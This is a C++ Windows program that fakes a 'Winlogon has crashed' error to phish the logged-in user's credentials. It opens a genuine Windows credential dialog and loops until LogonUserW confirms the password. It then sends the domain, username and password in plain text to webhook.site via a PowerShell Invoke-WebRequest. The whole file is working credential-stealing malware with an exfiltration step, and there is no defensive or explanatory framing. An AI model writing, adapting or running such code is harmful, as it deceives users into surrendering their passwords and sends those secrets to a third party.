#include <Windows.h>
#include <tchar.h>
#include <CommCtrl.h>
#include <wincred.h>
#include <atlstr.h>
#include <stdlib.h>
#include <string>

//#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Credui.lib")

void spoof() {

	BOOL loginStatus = FALSE;
	MessageBoxA(nullptr, "Winlogon has crashed unexpectedly.Please enter your password to connect to winlogon", "Authentication", MB_OK | MB_ICONERROR);
	do {

		CREDUI_INFOW credui = {};
		credui.cbSize = sizeof(credui);
		credui.hwndParent = nullptr;
		//credui.pszMessageText = L"...";
		credui.pszCaptionText = L"Please verify your Windows user credentials to proceed.";
		credui.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID outCredBuffer = nullptr;
		ULONG outCredSize = 0;
		BOOL save = false;
		DWORD err = 0;

		err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, CREDUIWIN_ENUMERATE_ADMINS); // to get pass of current user logged-in
	  //err = CredUIPromptForWindowsCredentialsW(&credui, err, &authPackage, nullptr, 0, &outCredBuffer, &outCredSize, &save, NULL);
		if (err == ERROR_SUCCESS) {
			WCHAR pszUName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR pszPwd[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			WCHAR domain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD maxLenName = CREDUI_MAX_USERNAME_LENGTH + 1;
			DWORD maxLenPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			DWORD maxLenDomain = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			CredUnPackAuthenticationBufferW(CRED_PACK_PROTECTED_CREDENTIALS, outCredBuffer, outCredSize, pszUName, &maxLenName, domain, &maxLenDomain, pszPwd, &maxLenPassword);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(pszUName, parsedUserName, CREDUI_MAX_USERNAME_LENGTH + 1, parsedDomain, CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(parsedUserName, parsedDomain, pszPwd, LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &handle);
			auto output = std::wstring(L"Domain:");
			output.append(parsedDomain);
			output.append(L"--Username:");
			output.append(parsedUserName);
			output.append(L"--Password:");
			output.append(pszPwd);
			std::string out(output.begin(), output.end());
			std::string ss = "powershell Invoke-WebRequest -Uri 'https://webhook.site/' -Body " + out + " -Method POST";  // type webhook or ngrok
			if (loginStatus == TRUE) {
				CloseHandle(handle);
				system(ss.c_str());
				break;
			}
			MessageBoxA(nullptr, "Please enter correct password", "Authentication", MB_OK | MB_ICONWARNING);
		}
	} while (loginStatus == FALSE);
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	spoof();
	return 0;
}
